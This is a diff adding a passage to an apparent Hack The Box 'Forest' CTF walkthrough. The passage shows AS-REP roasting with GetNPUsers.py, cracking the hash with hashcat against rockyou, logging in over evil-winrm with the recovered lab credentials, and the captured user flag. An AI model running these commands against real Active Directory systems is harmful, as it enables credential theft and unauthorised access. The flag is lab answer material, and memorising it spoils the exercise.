@@ -60,3 +60,15 @@ able to ASRepRoast
 ```
 
 ![asreproast](/images/forest/asreproast.png)
+
+
+`GetNPUsers.py` can create a well formated file right away by passing the parameter `-format hashcat -outputfile userhash.txt`
+
+Done so, I could afterwards crack the hash with `hashcat -m18200 --force userhash.txt  /usr/share/wordlists/rockyou.txt` which gives me the credentials `svc-alfresco:s3rvice`
+
+![hashcat](/images/forest/hashcat.png)
+
+this credentials, I could use to establish a connection with winrm (`evil-winrm -i forest.htb -u svc-alfresco -p s3rvice
+`) and grab the user-flag `e5e4e47ae7022664cda6eb013fb0d9ed`.
+
+![userflag](/images/forest/userflag.png)
